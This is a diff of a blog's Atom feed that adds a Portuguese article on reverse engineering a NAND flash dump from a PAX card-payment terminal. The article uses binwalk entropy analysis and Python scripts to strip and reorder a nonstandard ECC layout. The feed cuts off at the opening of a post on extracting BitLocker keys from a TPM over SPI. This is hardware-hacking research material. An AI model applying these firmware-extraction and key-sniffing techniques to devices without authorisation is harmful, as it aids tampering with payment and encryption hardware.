@@ -1,4 +1,1169 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="pt" /><updated>2023-01-19T12:50:33+00:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletrônica, Computação, Física.  Todos os hacks que eu fizer, serão colocados aqui. Aceito sugestões :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">Rotor de Antena - Parte 2</title><link href="https://lucasteske.dev/2021/04/rotor-antenna-parte-2" rel="alternate" type="text/html" title="Rotor de Antena - Parte 2" /><published>2021-04-01T05:23:00+00:00</published><updated>2021-04-01T05:23:00+00:00</updated><id>https://lucasteske.dev/2021/04/rotor-antenna-parte-2</id><content type="html" xml:base="https://lucasteske.dev/2021/04/rotor-antenna-parte-2"><![CDATA[<p>Continuando o projeto do tracker, consegui alguns progressos significativos. Assim como o Demilson (PY2UEP) tinha cortado os motores originais, fiz o mesmo. O motor do azimute estava bem enferrujado e acabei estragando uma de suas bobinas (queria reaproveitar o fio), mas no fim o eixo saiu.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="pt"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://lucasteske.dev/feed.xml" rel="self" type="application/atom+xml" /><link href="https://lucasteske.dev/" rel="alternate" type="text/html" hreflang="pt" /><updated>2024-01-17T00:54:12+00:00</updated><id>https://lucasteske.dev/feed.xml</id><title type="html">Lets Hack It</title><subtitle>Sou Lucas Teske, gosto de Eletrônica, Computação, Física.  Todos os hacks que eu fizer, serão colocados aqui. Aceito sugestões :D</subtitle><author><name>Lucas Teske</name><email>letshackit@nvx.li</email></author><entry><title type="html">Análise e Decodificação de Memória Flash NAND - Revelando a Dispersão ECC em Dispositivos Desconhecidos</title><link href="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash" rel="alternate" type="text/html" title="Análise e Decodificação de Memória Flash NAND - Revelando a Dispersão ECC em Dispositivos Desconhecidos" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/analise-e-decodificacao-de-memoria-flash"><![CDATA[<h2 id="explorando-memorias-nand">Explorando memorias NAND</h2>
+
+<p>Quando em posse de um dispositivo a qual se deseja conhecer sobre, nem sempre é trivial o acesso ao conteúdo da memória <em>flash</em>. Devido a natureza das memórias NAND, é aplicado para todo conteúdo um algorítimo de correção de erros que pode causar uma ofuscação não  intencional do conteúdo. Alguns fabricantes de processadores que controlam diretamente memórias do tipo NAND ou programadores de <em>software</em> “protegido” optam por customizar o jeito que estes algorítimos funcionam.</p>
+
+<p>Neste artigo veremos como a estrutura básica de uma memória <em>flash</em>, por que a correção de erro existe e como identificar a dispersão do algorítimo de correção de erro usado.</p>
+
+<h1 id="memórias-flash">Memórias Flash</h1>
+
+<p>As memórias flash têm se destacado como a espinha dorsal do armazenamento digital na era contemporânea. Presentes em dispositivos tão variados quanto SSDs, pen drives e cartões SD, estas memórias trazem uma combinação irresistível de rapidez, durabilidade e capacidade de retenção de dados mesmo na ausência de energia.</p>
+
+<p>Historicamente, antes da ascensão das memórias flash, os principais dispositivos de armazenamento eram baseados em mídias magnéticas, como discos rígidos e disquetes, ou em memórias do tipo <em>EPROM</em> (Erasable Programmable Read Only Memory). Enquanto as mídias magnéticas possuíam partes móveis e eram mais propensas a falhas físicas, as EPROMs necessitavam de um processo de apagamento específico, tornando a regravação de dados um processo mais lento e menos eficiente.</p>
+
+<p>Dentro da categoria de memórias flash, encontramos diferentes variações, com as versões NOR e NAND sendo as mais predominantes. Neste artigo, focaremos nas memórias flash do tipo NAND, reconhecidas por sua alta densidade de armazenamento e amplamente utilizadas em dispositivos de armazenamento cotidianos, garantindo velocidade e confiabilidade na leitura e gravação de dados.</p>
+
+<h2 id="anatomia-de-uma-célula-nand">Anatomia de uma Célula NAND</h2>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell.svg" alt="Célula de memória Flash" />
+<em>Diagrama detalhado de uma célula NAND</em></p>
+
+<p>No coração da tecnologia de memória flash, encontra-se a intricada arquitetura de uma célula NAND. A ilustração acima delineia os componentes fundamentais da célula: o Control Gate, o Floating Gate, camadas isolantes de óxido, juntamente com os terminais N-Type Source e N-Type Drain, todos construídos sobre um substrato do tipo-P.
+Os bits são armazenados na memória flash retendo elétrons no Floating Gate.</p>
+
+<p>Durante a operação de gravação, uma tensão é imposta sobre o Control Gate, induzindo elétrons a atravessarem a barreira de óxido e se alojarem no Floating Gate. Assim que os elétrons alcançam o Floating Gate, eles permanecem lá, denotando um estado “gravado”.
+<img src="/assets/posts/analise-e-decodificacao-flash/flash-write.svg" alt="Processo de gravação em memória flash" /></p>
+
+<p>Para ler a informação armazenada, uma tensão é aplicada ao Control Gate. Se houver elétrons no Floating Gate, eles criarão uma força de repulsão, bloqueando a passagem de elétrons do Source para o Drain. Este estado é reconhecido como um bit “0”. Contudo, se o Floating Gate estiver desocupado, a corrente elétrica circulará sem impedimentos, correspondendo a um bit “1”.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" alt="Estado programado de uma célula NAND" />
+<em>Célula NAND no estado “gravado”</em></p>
+
+<p>Finalmente, a configuração elétronica — seja sua ausência ou presença — determina se a célula está representando um bit “0” ou “1”. A imagem subsequente mostra uma célula no estado “apagado”, caracterizado pela livre circulação de elétrons entre os terminais.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-cell-erased.svg" alt="Estado apagado de uma célula NAND" />
+<em>Célula NAND no estado “apagado”</em></p>
+
+<h2 id="arquitetura-da-memória-nand">Arquitetura da Memória NAND</h2>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/nand-block.svg" alt="Estrutura de Bloco NAND Block" />
+<em>Diagrama representando a organização de um bloco NAND</em></p>
+
+<p>A memória NAND é meticulosamente organizada em uma estrutura hierárquica. Começando pela menor unidade, temos a célula. Estas células são, por sua vez, agrupadas para formar páginas. Avançando na hierarquia, múltiplas páginas são então consolidadas para constituir um bloco, como ilustrado no diagrama acima.</p>
+
+<p>Essa disposição estrutural não é apenas por organização. Ela desempenha um papel vital na eficiência das operações da memória flash. Um detalhe importante a se considerar é que, em diversos dispositivos baseados em tecnologia flash, a operação de apagamento é executada em nível de bloco, e não em células ou páginas individuais.</p>
+
+<p>A imagem exemplifica uma memória NAND que contém páginas de 2048 bytes de dados acrescidos de 64 bytes destinados à correção de erro, totalizando 2112 bytes por página. Estas páginas estão agrupadas em blocos que abrigam 64 páginas cada, resultando em 128K bytes de dados e 4K bytes para correção.</p>
+
+<p>Os bytes adicionais em cada página não são meros complementos. Eles são intrínsecos à integridade da memória. Embora sejam armazenados da mesma forma que qualquer outro byte, muitas vezes são alocados para funções específicas, como paridade em algoritmos de Correção de Erros (ECC). Essa correção é indispensável, pois, durante a fabricação ou mesmo ao longo do uso, é possível que algumas células da memória NAND apresentem defeitos ou se desgastem, comprometendo a precisão dos dados armazenados. O ECC, portanto, atua como uma camada protetora, assegurando a confiabilidade dos dados mesmo diante de imperfeições na memória.</p>
+
+<h2 id="lendo-memórias-flash">Lendo memórias Flash</h2>
+
+<p>Ao lidar com leitura e gravação em memórias Flash, existe uma variedade de dispositivos disponíveis. Para memórias flash com encapsulamentos menos convencionais, como o BGA (Ball Grid Array), frequentemente recorro ao programador RT809H, utilizando um adaptador específico para tal encapsulamento. A memória flash em questão foi originalmente extraída de um equipamento da PAX, um modelo disponível no Mercado Livre sob a descrição “máquina de cartão”. Vale destacar que o tipo de encapsulamento dessa memória flash é BGA63, indicando um arranjo de 63 pinos no formato ball-grid-array.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/flash_memory.jpg" alt="Memória Flash no programador universal RT809H pronto para leitura" /><em>Memória Flash no programador universal RT809H pronto para leitura</em></p>
+
+<p>Após a extração dos dados da memória flash, um passo fundamental é a utilização da ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code>. Este comando tem a função de vasculhar e listar possíveis assinaturas de arquivos conhecidos contidos no dump da memória, permitindo uma análise preliminar de seu conteúdo. Essa etapa é crucial para discernir se enfrentaremos desafios ao tentar decifrar os dados armazenados, como no caso de estarem criptografados.</p>
+
+<p>É importante ressaltar que a imagem produzida pelo programador RT809H retrata o conteúdo da memória flash em seu estado mais puro, sem qualquer filtragem. Isso significa que os bits de paridade do ECC (Error-Correcting Code) estão inclusos. Esta característica pode introduzir nuances durante a análise, pois nem todas as assinaturas serão reconhecidas de maneira acurada, principalmente se considerarmos arquivos que podem iniciar no final de uma página de memória.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+438548        0x6B114         Base64 standard index table
+<span class="o">(</span>...<span class="o">)</span>
+3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
+7839754       0x77A00A        uImage header, header size: 64 bytes, header CRC: 0x538F3DE9, created: 2021-05-27 08:14:51, image size: 3696472 bytes, Data Address: 0x80800000, Entry Point: 0x80800000, data CRC: 0xA22F74A5, OS: Linux, CPU: ARM, image <span class="nb">type</span>: OS Kernel Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"Linux-2.7.93.9707R"</span>
+7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>little-endian<span class="o">)</span>
+7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 <span class="o">(</span>null <span class="nb">date</span><span class="o">)</span>
+<span class="o">(</span>...<span class="o">)</span>
+20815882      0x13DA00A       uImage header, header size: 64 bytes, header CRC: 0xF95F6882, created: 2021-05-27 08:20:25, image size: 8185419 bytes, Data Address: 0x83800000, Entry Point: 0x83800000, data CRC: 0xE5674944, OS: Linux, CPU: ARM, image <span class="nb">type</span>: RAMDisk Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"RAMDISK-2.7.93.9707R"</span>
+<span class="o">(</span>...<span class="o">)</span>
+20815946      0x13DA04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:20:23
+33792010      0x203A00A       uImage header, header size: 64 bytes, header CRC: 0x588DFFBC, created: 2021-05-27 08:19:13, image size: 6412038 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x32979F1E, OS: Linux, CPU: ARM, image <span class="nb">type</span>: Firmware Image, compression <span class="nb">type</span>: none, image name: <span class="s2">"BASE-2.7.93.9707R"</span>
+33792074      0x203A04A       <span class="nb">gzip </span>compressed data, maximum compression, from Unix, last modified: 2021-05-27 08:19:11
+46768138      0x2C9A00A       UBI erase count header, version: 1, EC: 0x3, VID header offset: 0x800, data offset: 0x1000
+</code></pre></div></div>
+
+<p>A avaliação da entropia é uma técnica eficaz para detectar conteúdo criptografado ou compactado em uma memória. Quando falamos de entropia em dados, estamos nos referindo à quantidade de informação ou imprevisibilidade contida nesses dados. A ferramenta <code class="language-plaintext highlighter-rouge">binwalk</code> oferece um modo específico para medir essa entropia.</p>
+
+<p>Arquivos que estão compactados ou criptografados tendem a exibir um padrão de dados aparentemente aleatório, resultando em uma medida de entropia que se aproxima de 1. Em contraste, arquivos “plain-text” ou dados não codificados geralmente possuem entropia significativamente mais baixa, tendendo para valores próximos de 0, pois seu conteúdo é mais previsível.</p>
+
+<p>Para explorar essa funcionalidade no <code class="language-plaintext highlighter-rouge">binwalk</code>, utiliza-se a opção <code class="language-plaintext highlighter-rouge">-E</code>, que ativa o modo de medição de entropia. Ao executá-la, você receberá um gráfico que visualmente representará as variações de entropia ao longo do arquivo, facilitando a identificação de segmentos criptografados ou compactados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk <span class="nt">-E</span> F59L1G81MA@BGA63_1111.BIN
+DECIMAL       HEXADECIMAL     ENTROPY
+<span class="nt">--------------------------------------------------------------------------------</span>
+0             0x0             Falling entropy edge <span class="o">(</span>0.027839<span class="o">)</span>
+7880704       0x784000        Rising entropy edge <span class="o">(</span>0.995063<span class="o">)</span>
+12345344      0xBC6000        Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
+20869120      0x13E7000       Rising entropy edge <span class="o">(</span>0.997811<span class="o">)</span>
+29257728      0x1BE7000       Falling entropy edge <span class="o">(</span>0.000000<span class="o">)</span>
+33824768      0x2042000       Rising entropy edge <span class="o">(</span>0.999076<span class="o">)</span>
+40386560      0x2684000       Falling entropy edge <span class="o">(</span>0.372003<span class="o">)</span>
+47253504      0x2D10800       Falling entropy edge <span class="o">(</span>0.725862<span class="o">)</span>
+62879744      0x3BF7800       Falling entropy edge <span class="o">(</span>0.737729<span class="o">)</span>
+67244032      0x4021000       Rising entropy edge <span class="o">(</span>0.966013<span class="o">)</span>
+67311616      0x4031800       Falling entropy edge <span class="o">(</span>0.776734<span class="o">)</span>
+69611520      0x4263000       Falling entropy edge <span class="o">(</span>0.790624<span class="o">)</span>
+69679104      0x4273800       Rising entropy edge <span class="o">(</span>0.972091<span class="o">)</span>
+69814272      0x4294800       Falling entropy edge <span class="o">(</span>0.836573<span class="o">)</span>
+70322176      0x4310800       Falling entropy edge <span class="o">(</span>0.844177<span class="o">)</span>
+72689664      0x4552800       Falling entropy edge <span class="o">(</span>0.643195<span class="o">)</span>
+74008576      0x4694800       Falling entropy edge <span class="o">(</span>0.783870<span class="o">)</span>
+74584064      0x4721000       Falling entropy edge <span class="o">(</span>0.471472<span class="o">)</span>
+75259904      0x47C6000       Falling entropy edge <span class="o">(</span>0.787818<span class="o">)</span>
+76613632      0x4910800       Falling entropy edge <span class="o">(</span>0.823394<span class="o">)</span>
+76748800      0x4931800       Falling entropy edge <span class="o">(</span>0.687502<span class="o">)</span>
+82837504      0x4F00000       Falling entropy edge <span class="o">(</span>0.360502<span class="o">)</span>
+84291584      0x5063000       Falling entropy edge <span class="o">(</span>0.775172<span class="o">)</span>
+84934656      0x5100000       Falling entropy edge <span class="o">(</span>0.714603<span class="o">)</span>
+95385600      0x5AF7800       Falling entropy edge <span class="o">(</span>0.788762<span class="o">)</span>
+103233536     0x6273800       Falling entropy edge <span class="o">(</span>0.775540<span class="o">)</span>
+104992768     0x6421000       Falling entropy edge <span class="o">(</span>0.750242<span class="o">)</span>
+124475392     0x76B5800       Falling entropy edge <span class="o">(</span>0.281623<span class="o">)</span>
+125253632     0x7773800       Falling entropy edge <span class="o">(</span>0.750710<span class="o">)</span>
+133507072     0x7F52800       Falling entropy edge <span class="o">(</span>0.798972<span class="o">)</span>
+137566208     0x8331800       Falling entropy edge <span class="o">(</span>0.768062<span class="o">)</span>
+137701376     0x8352800       Falling entropy edge <span class="o">(</span>0.743758<span class="o">)</span>
+</code></pre></div></div>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/flash-entropy.svg" alt="Entropia da Imagem Lida" /><em>Entropia da Imagem Lida</em></p>
+
+<p>No gráfico de entropia apresentado, as áreas de alta entropia se destacam como picos que se aproximam do valor 1 no eixo vertical. Estas regiões apontam para trechos de dados que têm uma distribuição que parece aleatória de bits, o que é típico de dados compactados ou criptografados.</p>
+
+<p>Ao cruzar a posição destes picos com as informações fornecidas pelo comando <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos entender a natureza destes segmentos de alta entropia. No nosso caso, os pontos de alta entropia correspondem a partes compactadas, e não a dados criptografados. Essa dedução fica clara quando vemos que o <code class="language-plaintext highlighter-rouge">binwalk</code> identificou assinaturas relacionadas a dados compactados com <em>gzip</em> nas posições indicadas.</p>
+
+<p>O fato de reconhecer essas assinaturas mostra claramente que o conteúdo, apesar de compactado, não está criptografado. Se fosse, o <code class="language-plaintext highlighter-rouge">binwalk</code> não teria identificado essas assinaturas, pois os dados criptografados se parecem com um monte de informações aleatórias, sem padrões específicos. Então, olhando tanto o gráfico de entropia quanto as informações do <code class="language-plaintext highlighter-rouge">binwalk</code>, conseguimos uma boa ideia da estrutura e tipo dos dados na memória flash analisada.</p>
+
+<h2 id="quando-a-dispersão-do-ecc-não-é-padrão">Quando a dispersão do ECC não é padrão</h2>
+
+<p>Para garantir que os dados sejam acessados de forma precisa, é fundamental excluir os bits de paridade inseridos em cada página de memória. Supondo que os últimos 64 bytes de cada página sejam alocados para o ECC, podemos criar um script Python que lê os 2112 bytes (representando a página completa de memória) e grava somente os 2048 bytes correspondentes ao dado puro, desconsiderando o ECC, em um novo arquivo.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"F59L1G81MA@BGA63_1111.BIN"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
+<span class="n">o</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"FIXEDDATA.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
+  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[:</span><span class="mi">2048</span><span class="p">])</span> <span class="c1"># Nuke ECC
+</span>  <span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">o</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Com os dados agora limpos, a próxima etapa é identificar os arquivos presentes para verificar a eficácia da nossa suposição. Uma olhada rápida na lista de arquivos destacados pelo <em>binwalk</em> nos fornecerá uma indicação.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>binwalk F59L1G81MA@BGA63_1111.BIN
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+438548        0x6B114         Base64 standard index table
+439650        0x6B562         DES PC1 table
+439738        0x6B5BA         DES PC2 table
+440945        0x6BA71         DES SP2, little endian
+441738        0x6BD8A         DES SP1, little endian
+477666        0x749E2         Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
+478540        0x74D4C         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
+479065        0x74F59         Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
+1384724       0x152114        Base64 standard index table
+1385826       0x152562        DES PC1 table
+1385914       0x1525BA        DES PC2 table
+1387121       0x152A71        DES SP2, little endian
+1387914       0x152D8A        DES SP1, little endian
+1423842       0x15B9E2        Certificate <span class="k">in </span>DER format <span class="o">(</span>x509 v3<span class="o">)</span>, header <span class="o">(</span>...<span class="o">)</span>
+1424716       0x15BD4C        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
+1425241       0x15BF59        Object signature <span class="k">in </span>DER format <span class="o">(</span>PKCS header <span class="o">(</span>...<span class="o">)</span>
+3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
+7839754       0x77A00A        uImage header, header size: 64 bytes, header <span class="o">(</span>...<span class="o">)</span>
+7839818       0x77A04A        Linux kernel ARM boot executable zImage <span class="o">(</span>litt<span class="o">(</span>...<span class="o">)</span>
+7857081       0x77E3B9        <span class="nb">gzip </span>compressed data, maximum compression,   <span class="o">(</span>...<span class="o">)</span>
+<span class="o">(</span>...<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Podemos identificar um <em>bitmap</em> logo no começo da imagem, onde o <em>binwalk</em> consegue inclusive identificar o tamanho e profundidade de bits dele:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3514378       0x35A00A        PC bitmap, Windows 3.x format,, 320 x 240 x 24
+</code></pre></div></div>
+
+<p>Uma característica marcante dos <em>bitmaps</em> é a forma como armazenam informações de cores. Os bytes no arquivo mapeiam diretamente para as cores da imagem. Assim, quando temos uma região da imagem que apresenta uma única cor, essa cor é representada por sequências consecutivas de bytes idênticos no arquivo. Essa propriedade é especialmente útil quando tentamos discernir a distribuição dos bits de correção de erro (ECC). Se um segmento do bitmap, que se ajusta a uma página de memória, exibe a mesma cor que outro segmento em uma página diferente, é esperado que seus bits de ECC correspondentes sejam idênticos.</p>
+
+<p>Considerando que a imagem identificada possui uma profundidade de cor de 24 bpp (bits por pixel), cada pixel é representado por 3 bytes. Dada a capacidade de uma página de memória ser de 2048 bytes, isso se traduz em cerca de 682 pixels por página. Isso é ligeiramente mais do que duas linhas da imagem. A tentativa de acessar o <em>bitmap</em> na sua forma atual sugere inconsistências, o que nos leva a questionar nossas suposições iniciais sobre a distribuição dos bits de ECC.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/pax-broken.jpg" alt="Logotipo corrompido da PAX" /><em>Logotipo corrompido da PAX</em></p>
+
+<p>Para uma interpretação adequada, é vital extrair várias páginas da memória contendo os dados do bitmap de forma alinhada. Dessa forma, podemos ter certeza de que a cada intervalo de 2112 bytes, estamos lidando com uma nova página, e não uma continuação da anterior. Posteriormente, podemos utilizar um software de edição de imagem que permita manipular imagens em formatos “RAW” arbitrários. Neste contexto, utilizaremos o GIMP para analisar os dados crus da imagem. Uma das vantagens do GIMP é a flexibilidade em definir a geometria da imagem e a formatação dos pixels.</p>
+
+<p>Para facilitar a identificação dos bits de ECC, definiremos a largura da imagem como 2112, correspondendo ao tamanho da página de memória. Isso permitirá visualizar cada página de memória como uma linha distinta. Vamos escolher uma representação de 8 bits por pixel, em tom monocromático, para garantir uma correspondência exata de 2112 bytes por linha. Em relação à altura, optaremos por, no mínimo, 100 linhas, de modo a proporcionar uma visão clara das variações entre as diferentes páginas de memória.</p>
+
+<p>Ao examinar a representação visual fornecida pelo GIMP, notamos segmentos claramente definidos de 512 bytes dentro de cada página de memória. Esses segmentos são intercalados com colunas mais finas, cuja aparência parece diretamente influenciada pelo bloco adjacente.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis.jpg" alt="Blocos de 512 bytes" /><em>Blocos de 512 bytes</em></p>
+
+<p>Observando mais atentamente, percebemos que as linhas completamente pretas apresentam uma coluna com padrões consistentes à esquerda da marcação de 512 bytes. Contrapondo-se a isso, linhas que exibem alguma variação também manifestam discrepâncias nessa mesma coluna à esquerda. Com base nessa observação, podemos inferir que as colunas posicionadas tanto à esquerda quanto à direita do segmento de 512 bytes representam, de fato, dados de paridade, e não são parte intrínseca do bitmap. Isso se torna ainda mais evidente considerando que as primeiras linhas do bitmap são inteiramente pretas.</p>
+
+<p>Ao considerar a página de memória em sua totalidade, outro detalhe se destaca: apesar do padrão observado, há uma coluna completamente branca em uma posição inesperada. Além disso, a primeira coluna, que teoricamente deveria ser branca, parece estar deslocada ou alterada de alguma forma.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-1.png" alt="Coluna aparentemente trocada de lugar" /><em>Coluna aparentemente trocada de lugar</em></p>
+
+<p>A hipótese levantada sugere que, por alguma razão, essas colunas podem ter sido trocadas de lugar durante o processo de dispersão. Para validar essa suposição, uma abordagem prática seria utilizar o próprio GIMP para reposicionar a coluna e avaliar se o conteúdo resultante se alinha de forma harmoniosa com o restante da página de memória.</p>
+
+<p><img src="/assets/posts/analise-e-decodificacao-flash/block-analysis-3.png" alt="Trocando colunas identificadas de local" /><em>Trocando colunas identificadas de local</em></p>
+
+<p>A imagem acima valida nossa conjectura, destacando que a realocação das colunas proporciona uma visualização mais coerente do conteúdo. Embora pareça incomum à primeira vista, considerando a natureza de segurança do dispositivo, é plausível pensar que essa disposição alterada possa ser uma forma deliberada de esconder dados. Essa peculiaridade não é mencionada em nenhuma documentação pública disponível para o processador do dispositivo.</p>
+
+<p>Com base nessas descobertas, temos as ferramentas necessárias para aprimorar nosso script em Python, visando eliminar os bits de paridade e rearranjar os segmentos de 512 bytes, com o objetivo de obter uma imagem refinada e coerente.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"F59L1G81MA@BGA63_1111.BIN"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
+<span class="n">o</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"FIXEDDATA.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span>
+<span class="n">pagesToRead</span> <span class="o">=</span> <span class="mi">65536</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">pagesToRead</span><span class="p">):</span>
+  <span class="n">page</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">2112</span><span class="p">)</span>
+  <span class="n">data</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">page</span><span class="p">[</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">535</span><span class="p">:</span><span class="mi">535</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1060</span><span class="p">:</span><span class="mi">1060</span><span class="o">+</span><span class="mi">512</span><span class="p">]</span> <span class="o">+</span> <span class="n">page</span><span class="p">[</span><span class="mi">1585</span><span class="p">:</span><span class="mi">1585</span><span class="o">+</span><span class="mi">512</span><span class="p">])</span>
+  <span class="n">data</span><span class="p">[</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="mi">48</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">page</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="n">o</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">o</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Após todos os passos de análise e correção, conseguimos extrair o <em>bitmap</em> e validar que todas as nossas hipóteses e métodos de análise estavam corretos:
+<img src="/assets/posts/analise-e-decodificacao-flash/pax-fixed.jpg" alt="Logotipo &quot;ajustado&quot; da PAX" /><em>Logotipo “ajustado” da PAX</em></p>
+
+<h2 id="conclusão">Conclusão</h2>
+
+<p>É essencial destacar que nossa abordagem se limitou a <strong>remover</strong> os bits de paridade, sem aplicar de fato o algoritmo de correção de erros. Como mencionado anteriormente, as memórias flash, particularmente as do tipo NAND, podem apresentar bits defeituosos, inclusive desde sua fabricação. A omissão do algoritmo de ECC específico pode resultar em inconsistências nos dados finais.</p>
+
+<p>Por sorte, o conteúdo deste dispositivo específico <strong>não</strong> estava criptografado, o que nos facilitou na análise de dispersão, aproveitando-se apenas de um conteúdo conhecido. Se o conteúdo estivesse criptografado, seria essencial identificar um padrão recorrente (como páginas de memória vazias) onde a informação de ECC estaria gravada.</p>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[Explorando memorias NAND]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" /><media:content medium="image" url="https://lucasteske.dev/assets/posts/analise-e-decodificacao-flash/flash-cell-programmed.svg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TPM 2.0: Extrair chaves do Bitlocker por SPI</title><link href="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker" rel="alternate" type="text/html" title="TPM 2.0: Extrair chaves do Bitlocker por SPI" /><published>2024-01-16T23:48:00+00:00</published><updated>2024-01-16T23:48:00+00:00</updated><id>https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker</id><content type="html" xml:base="https://lucasteske.dev/pt/2024/01/tpm-2-extraindo-chaves-bitlocker"><![CDATA[<p>O TPM 2.0, também conhecido como Trusted Platform Module 2.0, é um recurso de segurança de hardware que está incorporado em muitos computadores modernos. Sua finalidade é proporcionar uma maneira segura de armazenar chaves criptográficas e outros 